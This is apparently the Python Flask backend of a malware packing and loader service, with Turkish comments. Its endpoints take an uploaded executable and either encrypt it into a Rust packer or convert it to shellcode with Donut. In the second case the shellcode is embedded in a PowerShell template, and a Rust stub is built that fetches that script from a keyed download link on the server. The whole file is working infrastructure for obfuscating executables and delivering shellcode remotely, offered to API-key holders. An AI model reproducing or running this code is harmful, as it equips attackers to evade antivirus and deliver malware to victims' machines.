import os
import json
import donut
import tempfile
import shutil
import subprocess
import re
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

# Ayarlar
UPLOAD_FOLDER = "stubs/main"
USERS_FILE = "db/users.json"
TEMPLATE_FILE = "templates/ps_template.ps1"
ALLOWED_EXTENSIONS = {"exe"}

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_next_ps_filename(user_id):
    """Sıradaki PS dosya numarasını bul"""
    user_ps_dir = f"stubs/{user_id}/ps"
    os.makedirs(user_ps_dir, exist_ok=True)

    existing_files = [f for f in os.listdir(user_ps_dir) if f.startswith("ps") and f.endswith(".ps1")]
    if not existing_files:
        return "ps1.ps1"

    numbers = [int(f[2:-4]) for f in existing_files if f[2:-4].isdigit()]
    next_num = max(numbers) + 1 if numbers else 1
    return f"ps{next_num}.ps1"

@app.route("/api/pack", methods=["POST"])
def pack():
    key = request.args.get("key")
    if not key:
        return jsonify({"error": "No key provided"}), 400

    users = load_users()
    if key not in users:
        return jsonify({"error": "Invalid API key"}), 403

    user_id = users[key]["id"]

    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    file = request.files["file"]
    if not file or file.filename == "":
        return jsonify({"error": "Empty filename"}), 400

    if not allowed_file(file.filename):
        return jsonify({"error": "Only .exe files are allowed"}), 400

    with tempfile.TemporaryDirectory() as temp_dir:
        # Save the uploaded file to the temporary directory
        input_exe_path = os.path.join(temp_dir, "input.exe")
        file.save(input_exe_path)

        try:
            # Run obin_generator.py to create key.rs and payload.rs in the temp_dir
            gen_process = subprocess.run(
                ["python3", os.path.abspath("obin_generator.py"), input_exe_path],
                capture_output=True, text=True, check=True, cwd=temp_dir
            )
            print(gen_process.stdout)

            # Copy the packer template to the temporary directory
            packer_template_dir = "templates/packer"
            temp_packer_dir = os.path.join(temp_dir, "packer")
            shutil.copytree(packer_template_dir, temp_packer_dir)

            # Read the generated key and payload
            with open(os.path.join(temp_dir, "key.rs"), 'r') as f:
                key_content = f.read()
            with open(os.path.join(temp_dir, "payload.rs"), 'r') as f:
                payload_content = f.read()

            # Inject the key and payload into the packer's main.rs
            packer_main_path = os.path.join(temp_packer_dir, "src", "main.rs")
            with open(packer_main_path, 'r') as f:
                packer_main_content = f.read()

            key_placeholder = re.compile(r"const SECRET_KEY: &\[u8\] = &\[.*?\];", re.DOTALL)
            payload_placeholder = re.compile(r"const PAYLOAD: &\[u8\] = &\[.*?\];", re.DOTALL)

            packer_main_content = key_placeholder.sub(key_content.strip(), packer_main_content, count=1)
            packer_main_content = payload_placeholder.sub(payload_content.strip(), packer_main_content, count=1)

            with open(packer_main_path, 'w') as f:
                f.write(packer_main_content)

            # Build the packer in the temporary directory
            build_process = subprocess.run(
                ["cargo", "build", "--release"],
                cwd=temp_packer_dir, capture_output=True, text=True, check=True
            )
            print(build_process.stdout)

            # Move the compiled exe to the user's directory
            user_exe_dir = f"stubs/{user_id}/packed_exe"
            os.makedirs(user_exe_dir, exist_ok=True)

            existing_exes = [f for f in os.listdir(user_exe_dir) if f.endswith(".exe")]
            next_num = len(existing_exes) + 1
            new_exe_name = f"packed_{next_num}.exe"

            built_exe_path = os.path.join(temp_packer_dir, "target", "release", "packer.exe")
            new_exe_path = os.path.join(user_exe_dir, new_exe_name)

            if os.path.exists(built_exe_path):
                shutil.move(built_exe_path, new_exe_path)
            else:
                return jsonify({"error": "Failed to find the built executable"}), 500

        except subprocess.CalledProcessError as e:
            return jsonify({
                "error": "Failed during the packing process",
                "details": e.stderr
            }), 500

    return jsonify({
        "status": "success",
        "message": "File packed successfully",
        "packed_exe_path": new_exe_path
    })


@app.route("/api/generator", methods=["POST"])
def generator():
    key = request.args.get("key")

    if not key:
        return jsonify({"error": "No key provided"}), 400

    users = load_users()
    if key not in users:
        return jsonify({"error": "Invalid API key"}), 403

    user_id = users[key]["id"]

    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400

    file = request.files["file"]
    if not file or file.filename == "":
        return jsonify({"error": "Empty filename"}), 400

    if not allowed_file(file.filename):
        return jsonify({"error": "Only .exe files allowed"}), 400

    # EXE'yi kaydet
    filename = f"{user_id}.exe"
    save_path = os.path.join(UPLOAD_FOLDER, filename)
    file.save(save_path)

    # Donut ile shellcode oluştur
    shellcode = donut.create(file=save_path)

    # Shellcode'u PowerShell formatına çevir
    shellcode_hex = ",".join([f"0x{byte:02x}" for byte in shellcode])

    # Template'i oku ve placeholder'ı değiştir
    with open(TEMPLATE_FILE, "r") as f:
        template = f.read()

    ps_script = template.replace("{{SHELLCODE_PLACEHOLDER}}", shellcode_hex)

    # PowerShell scriptini kaydet
    ps_filename = get_next_ps_filename(user_id)
    ps_save_path = f"stubs/{user_id}/ps/{ps_filename}"
    os.makedirs(os.path.dirname(ps_save_path), exist_ok=True)

    with open(ps_save_path, "w") as f:
        f.write(ps_script)

    raw_link = f"http://127.0.0.1:5000/{user_id}/ps/{ps_filename}?raw_key={users[key]['raw_key']}"

    with tempfile.TemporaryDirectory() as temp_dir:
        temp_stub_path = os.path.join(temp_dir, "stub")
        shutil.copytree("templates/stub", temp_stub_path, ignore=shutil.ignore_patterns('target'))

        # Modify the main.rs file in the temporary directory
        stub_main_path = os.path.join(temp_stub_path, "src", "main.rs")
        with open(stub_main_path, "r") as f:
            stub_code = f.read()

        stub_code = stub_code.replace("REPLACE_ME_WITH_RAW_LINK", raw_link)

        with open(stub_main_path, "w") as f:
            f.write(stub_code)

        # Build the stub
        try:
            subprocess.run(["cargo", "build", "--release", "--target-dir", os.path.abspath("templates/stub/target")], cwd=temp_stub_path, check=True)
        except subprocess.CalledProcessError as e:
            return jsonify({"error": "Failed to build the stub", "details": str(e)}), 500

        # Move the compiled exe to the stubs folder
        user_exe_dir = f"stubs/{user_id}/exe"
        os.makedirs(user_exe_dir, exist_ok=True)

        built_exe_path = os.path.join("templates/stub/target/release", "rust_s.exe")
        new_exe_path = os.path.join(user_exe_dir, f"{user_id}.exe")

        if os.path.exists(built_exe_path):
            shutil.move(built_exe_path, new_exe_path)

    return jsonify({
        "status": "success",
        "message": "File processed successfully",
        "exe_saved_as": filename,
        "ps_saved_as": ps_filename,
        "ps_path": ps_save_path,
        "raw_link": raw_link
    })

@app.route("/<user_id>/ps/<ps_filename>")
def get_ps_script(user_id, ps_filename):
    """Raw key ile PowerShell scriptini görüntüle"""
    raw_key = request.args.get("raw_key")

    if not raw_key:
        return jsonify({"error": "No raw_key provided"}), 400

    users = load_users()

    # Kullanıcıyı raw_key ile bul
    user_found = False
    for user_data in users.values():
        if user_data.get("raw_key") == raw_key and user_data.get("id") == user_id:
            user_found = True
            break

    if not user_found:
        return jsonify({"error": "Invalid raw_key or user_id"}), 403

    ps_file_path = f"stubs/{user_id}/ps/{ps_filename}"

    if not os.path.exists(ps_file_path):
        return jsonify({"error": "PS script not found"}), 404

    # Raw text olarak döndür
    with open(ps_file_path, "r") as f:
        content = f.read()

    return content, 200, {'Content-Type': 'text/plain'}

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
